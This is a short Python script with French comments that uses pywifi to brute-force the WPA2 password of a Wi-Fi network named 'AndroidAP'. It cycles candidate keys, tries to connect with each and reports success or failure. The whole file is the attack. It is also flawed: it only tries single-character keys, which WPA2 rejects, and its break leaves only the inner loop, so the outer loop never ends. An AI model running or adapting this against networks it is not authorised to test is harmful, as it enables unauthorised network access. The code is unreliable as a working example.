import pywifi
from pywifi import const
import time
import logging
import os
list = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9","&","é","~",'"',"'","#","{","(","[","-","|","è","`","_","ç","^","à","@",")","°","]","=","+","}","^","¨","$","£","¤","ù","%","*","µ","!","§",":","/",";",".","?",",",")"]
chaine = str()

    


# Créez un objet de point d'accès Wi-Fi
wifi = pywifi.PyWiFi()

# Obtenez l'interface Wi-Fi (adaptateur)
iface = wifi.interfaces()[0]  # Utilisez [0] si vous avez une seule interface Wi-Fi

# Définissez le profil Wi-Fi (SSID et mot de passe)
while True:

        for l in list:
            chaine = l   
            
           
            ssid = "AndroidAP"  
            mot_de_passe = chaine
            print(mot_de_passe)
            
            # Supprimez toutes les anciennes connexions Wi-Fi
            iface.scan()
            iface.disconnect()

            # Créez un profil Wi-Fi
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN  
            profile.akm.append(const.AKM_TYPE_WPA2PSK)  
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = mot_de_passe

            # Ajoutez le profil
            iface.remove_all_network_profiles()
            profile_id = iface.add_network_profile(profile)

            # Connectez réseau Wi-Fi
            iface.connect(profile_id)

            
          
            time.sleep(5)

            # Vérifiez l'état de la connexion
            if iface.status() == const.IFACE_CONNECTED:
                print("Connecté au réseau Wi-Fi avec succès!")
                break
            else:
                print("Échec de la connexion au réseau Wi-Fi.")

            # Vous êtes maintenant connecté au réseau Wi-Fi. Vous pouvez effectuer des opérations supplémentaires si nécessaire.

            # Pour déconnecter
            #iface.disconnect()
